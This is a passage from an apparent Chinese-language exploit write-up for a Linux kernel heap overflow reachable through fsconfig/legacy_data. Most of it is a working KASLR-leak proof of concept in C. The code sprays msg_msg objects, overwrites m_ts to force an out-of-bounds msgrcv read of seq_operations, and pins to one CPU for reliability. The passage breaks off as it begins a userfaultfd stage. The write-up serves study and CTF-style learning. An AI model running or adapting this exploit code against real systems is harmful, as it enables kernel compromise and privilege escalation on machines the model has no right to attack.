
```
        for (;;) {
                struct msg_receiver msr_d;

                        ...

                        msg = find_msg(msq, &msgtyp, mode);

                        ...

                        /*
                         * If we are copying, then do not unlink message and do
                         * not update queue parameters.
                         */
                        if (msgflg & MSG_COPY) {
                                msg = copy_msg(msg, copy);                         //复制我们的msg,但并不unlink，这里的返回msg是我们的dst，也就是copy这个参数
                                goto out_unlock0;
                        }

                        ...

                }

                ...

out_unlock0:
        ipc_unlock_object(&msq->q_perm);
        wake_up_q(&wake_q);
out_unlock1:
        rcu_read_unlock();
        if (IS_ERR(msg)) {
                free_copy(copy);
                return PTR_ERR(msg);
        }

        bufsz = msg_handler(buf, msg, bufsz);
        free_msg(msg);                 //最后释放copy

        return bufsz;
}
```
该段函数由于咱们传入的`MSG_COPY`标志位，导致其中我们接受的消息并不会进行下面的列表unlink操作，而是直接复制到临时`msg`，然后通过`msg_handler`（也就是`do_msg_fill`函数）传入给我们的用户区`buf`，最后释放掉我们刚刚创建的临时`msg`

# 五、漏洞利用

## 1. 基地址泄露

首先我们假设其处于真实环境，所以应开的保护基本都需要开启，目前我们先来解决一下`KASLR`导致的地址随机化问题

题目中我们需要泄露基地址，我们选用`msg_msg`搭配`seq_operations`的手法

我们现在已知的一个溢出为内核堆上的`legacy_data`后的溢出，因此我们如何利用`legacy_data`下一页的内容呢？这时我们可以想到使用堆喷的技巧，在这里我们选则使用`msg_msg`来进行堆喷，其中是因为他大小可控，且若申请大小大于一页，则会额外申请`msg_msgseg`结构体来继续存储消息，其二是因为他的分配标志为`GFP_KERNEL_COUNT`,他刚好同之前我们的`fsconfig`中申请的`fc->private`，也就是`legacy_data`相一致，如果此处选用`GFP_KERNEL`的结构体则会存在隔离情况，这个加上`COUNT`的标志位一般从`kmalloc-cg-*`来分配，后面不带`COUNT`的则从`kmalloc-*`分配

过程我打算就按照will的wp进行复现，其中的堆喷技巧也值得借鉴

首先我们要知道大致的堆喷范围，这里我们可以使用命令

```
cat /proc/slabinfo
```

查看一下自己本机的情况大致了解一下，我本机的内核版本是6.2

![](http://imgsrc.baidu.com/forum/pic/item/ae51f3deb48f8c54ff34121e7c292df5e0fe7f18.jpg)

由于我们这个属于大块，在分配的时候也是使用`kmalloc_large`来分配，所以相应的`slab`也较大，其中`objperslab`为8，也就是说同一个`slab`里面有8个这样的`obj`,所以我们的堆喷范围大概就是在这个范围左右

```
uint64_t do_leak(){
    uint64_t kernel_base;
    char pat[0x1000] = {0};
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};      //PAGE_SIZE*2
    int targets[0x10] = {0};
    msg* message = (msg* )(buffer); 
    int size = 0x1018;      
    /* msg_msg: (0x30)head, (0xfd0)message_0
     * msg_msgseg: (0x8)head, (0x18)message_1, for kmalloc-32 :)
     * */

    /* spray the msg_msg */
    for(int i = 0; i 
```
我们首先采取堆喷八个`msg_msg`，但是这里注意我们的消息长度为`(0x1018 - 0x30)`，这是为了保证我们可以增添一个额外的`msgseg`,这样可以，这里由于我们是要搭配后来的`seq_operations`，因此我们特意构造留给`msg_msgseg`的大小为`0x18`，也就是总共加上他的头为`0x20`，这样可以为我们之后的堆喷打基础:)

堆喷过后，我们正常利用`fsconfig`来构造溢出的临界状态，然后再继续进行堆喷，此处的目的是为了更大概率的使得我们溢出到`msg_msg`的头部分

```
    memset(pat, 0x42, sizeof(pat));

    pat[sizeof(pat) - 1] = '\x00';

    info_log("Opening the ext4 filesystem");

    fd = fsopen("ext4", 0);

    if (fd m_ts");

    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", evil, 0);
```
最后的`fsconfig`实际上就是在大概率写到`msg_msg`头部的情况下覆盖`msg_msg->m_ts`字段，制造出一个大数字的读取,下图就是我们恰好堆喷到我们溢出的部分

![](http://imgsrc.baidu.com/forum/pic/item/f31fbe096b63f6247571ef32c144ebf81a4ca3d7.jpg)

下图就是我们最后一次`fsconfig`的情况

![](http://imgsrc.baidu.com/forumm/pic/item/b999a9014c086e06eb86e97a44087bf40ad1cbd2.jpg)

可以看到我们的`m_ts`字段被修改为了`0x1060`,这样以来我们就可以越界进行读取，大伙还记得上面额外分配的`kmalloc-32`吗，接下来就得靠它了，之前顺便堆喷他的原因是为了让我们的`seq_operation`和他有一定概率出现在同一个`slab`里面

之后后面的泄露就是寻常化了，直接利用`msgrcv`系统调用，造成`OOB_read`，越界读取额外的`msg_msgseg`相邻的`seq_operations`函数指针，如下：

```
struct seq_operations {
        void * (*start) (struct seq_file *m, loff_t *pos);
        void (*stop) (struct seq_file *m, void *v);
        void * (*next) (struct seq_file *m, void *v, loff_t *pos);
        int (*show) (struct seq_file *m, void *v);
};
```
经过调试过程可得知，该`seq_operations->start`函数初始化为内核中的`single_start`函数，这样以来我们就可以实现内核基地址的泄露了

即可成功泄露基地址，但是我目前泄露是失败的，之后再看:(

![](http://imgsrc.baidu.com/forum/pic/item/c2fdfc039245d688701c6395e2c27d1ed21b24e1.jpg)

之后发现这里应该是由于多核心的缘故，导致`kmalloc`有一定几率转到别的核心`CPU`上面分配，所以导致的失败，所以这里进行一个简单的绑核即可寻找到固定偏移，如下：（后期考证也发现不绑核也可以成功，但成功率会大大下降，所以这里我们绑核了较好）

![](http://imgsrc.baidu.com/forum/pic/item/7dd98d1001e939016c1a510f3dec54e736d196e3.jpg)

下面的泄露`poc`也进行了相应修改

```
#define _GNU_SOURCE 

#include 

#include 

#include 

#include 

- 

#include 

#include 

#include 

#include 

#include 

#include 

#define IPC_PRIVATE (long)0

#define IPC_CREAT  00001000   /* create if key is nonexistent */

#define IPC_NOWAIT 00004000   /* return error on wait */

#define MSG_NOERROR     010000  /* no error if message is too big */

#define MSG_COPY        040000  /* copy (not remove) all queue messages */

#define SINGLE_START_OFFSET 0x35f200

#ifndef __NR_fsopen

#define __NR_fsopen 430

#endif

#ifndef __NR_fsconfig

#define __NR_fsconfig 431

#endif

#ifndef __NR_msgget

#define __NR_msgget 186

#endif

#ifndef __NR_msgget

#define __NR_msgsnd 189

#endif

#ifndef __NR_msgget

#define __NR_msgrcv 188

#endif

/* to run the exp on the specific core only */

void bind_cpu(int core)

{

    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);

    CPU_SET(core, &cpu_set);

    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

}

int fd;                 /* using by filesystem */

typedef struct{

    long mtype;          /* type of message */

        char mtext[1];                  /* message text */

}msg;

#define PRINT_ADDR(str, x) printf("\033[0m\033[1;34m[+]%s \033[0m:0x%lx\n", str, x)

void info_log(char* str){

         printf("\033[0m\033[1;32m[+]%s\033[0m\n",str);

}

void error_log(char* str){

  printf("\033[0m\033[1;31m[-]%s\033[0m\n",str);

  exit(1);

}

long get_msg(int key, int msgflg){

    return msgget(key, msgflg);

}

long send_msg(int msqid, void* msgp, size_t msgsz, int msgflg){

    return msgsnd(msqid, msgp, msgsz, msgflg);

}

long recv_msg(int msqid, void* msgp, size_t msgsz, long msgtyp, int msgflg){

    return msgrcv(msqid, msgp, msgsz, msgtyp, msgflg);

}

int fsopen(const char *fs_name, unsigned int flags)

{

    return syscall(__NR_fsopen, fs_name, flags);

}

int fsconfig(int fsfd, unsigned int cmd, 

             const char *key, const void *val, int aux)

{

    return syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);

}

uint64_t do_check_leak(char *buf) 

{

    uint64_t kbase = ((unsigned long*)buf)[510];

    if(!kbase){

        return 0;

    }   

    kbase -= SINGLE_START_OFFSET; 

    return kbase;

}

uint64_t do_leak(){

    uint64_t kernel_base;

    char pat[0x1000] = {0};

    char buffer[0x2000] = {0}, recieved[0x2000] = {0};      //PAGE_SIZE*2

    int targets[0x10] = {0};

    msg* message = (msg* )(buffer); 

    int size = 0x1018;      

    /* msg_msg: (0x30)head, (0xfd0)message_0

     * msg_msgseg: (0x8)head, (0x18)message_1, for kmalloc-32 :)

     * */

    /* spray the msg_msg */

    for(int i = 0; i m_ts");

    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", evil, 0);

    info_log("heap overflow done");

    info_log("Start spraying kmalloc-32 for seq_operations");

    size = 0x1060;

    for(int i = 0; i 
```

## 2. userfaultfd 利用

泄露完内核基地址后，我们就该考虑如何进行利用了，这里在读完源码之后可以发现，在我们调用`msgsnd`的过程中，走到`load_msg`这样一个函数，会使用`copy_from_user`来将我们传入的`buf`传递给创建的`msg`当中
